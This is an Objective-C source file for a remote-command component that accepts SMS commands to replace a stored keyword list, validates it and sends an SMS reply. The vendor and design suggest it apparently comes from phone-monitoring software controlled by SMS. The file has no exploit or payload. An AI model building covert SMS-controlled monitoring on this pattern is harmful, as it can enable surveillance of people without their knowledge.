
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetKeywordProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetKeywordProcessor.h"
#import "PrefKeyword.h"
#import "Preference.h"

@interface ResetKeywordProcessor (PrivateAPI)
- (void) processResetKeywords;
- (void) resetKeywordsException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetKeywords;
@end

@implementation ResetKeywordProcessor

@synthesize mKeywordList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetKeywordProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ResetKeywordProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetKeywordProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark ResetKeywordProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetKeywordProcessor
 - Argument list and description: No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ResetKeywordProcessor--->doProcessingCommand")
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		
		[self setMKeywordList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kKeywordValidation]];
		DLog(@"ResetKeywordProcessor--->keywords:%@",mKeywordList);
		if ([mKeywordList count]>0) {
			if ([self canResetKeywords]) {
				if (![RemoteCmdProcessorUtils isDuplicateString:mKeywordList]) [self processResetKeywords];
				else [self resetKeywordsException:kCmdExceptionErrorCannotAddDuplicateToKeywordList];
			}
			else {
				[self resetKeywordsException:kCmdExceptionErrorKeywordExceedListCapacity];
			}
		}
		else {
			[self resetKeywordsException:kCmdExceptionErrorInvalidKeywordToKeywordList];
		}
	} else {
		[self resetKeywordsException:kCmdExceptionErrorInvalidCmdFormat];
	}
	
}

#pragma mark ResetKeywordProcessor PrivateAPI Methods

/**
 - Method name: processResetKeywords
 - Purpose:This method is used to process reset keywords
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processResetKeywords {
	DLog (@"ResetKeywordProcessor--->processResetKeywords");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
	[prefKeyword setMKeywords:mKeywordList];
	[prefManager savePreferenceAndNotifyChange:prefKeyword];
	[self sendReplySMS];
}

/**
 - Method Name: canResetKeywords
 - Purpose:This method is used to check exceed keywordlist capacity. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) canResetKeywords {
	DLog (@"ResetKeywordProcessor--->canAddKeywords");
//	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
//	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
//	int count=[[prefKeyword mKeywords] count]+[mKeywordList count];
	int count = [mKeywordList count];
	if (count<=KEYWORD_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: resetKeywordsException
 - Purpose:This method is invoked reset keyword process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) resetKeywordsException: (NSUInteger) aErrorCode {
	DLog (@"ResetKeywordProcessor--->resetKeywordsException")
	FxException* exception = [FxException exceptionWithName:@"resetKeywordsException" andReason:@"Reset keyword error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetKeywordProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mKeywordList release];
	[super dealloc];
}


@end
